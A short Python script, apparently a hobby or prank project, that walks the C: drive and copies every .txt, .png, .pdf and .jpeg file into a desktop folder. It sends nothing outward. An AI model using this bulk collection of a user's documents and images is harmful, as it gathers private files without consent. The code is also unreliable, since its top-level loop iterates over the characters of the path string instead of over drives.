import shutil, os
from os.path import join
print("oof")
src = ""
dst = "C:\\Users\\NNguyen\\Desktop\\lol\\GREAT"
top = "C:\\"
for realTop in top:
    for theDirPath, theDirNames, theFileNames in os.walk(realTop):
        if "1AZN$WAG.txt" in theFileNames:
            print("double oof")
            break
        for file in theFileNames:
            if file.endswith(".txt"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".png"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".pdf"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
            if file.endswith(".jpeg"):
                src = join(theDirPath, file)
                print(src)
                shutil.copy2(src,dst)
a=0
while a < 3: 
    print("(^_^)")
    a+=1

    #".txt", ".pdf", ".png", ".jpeg", ".xlsx"):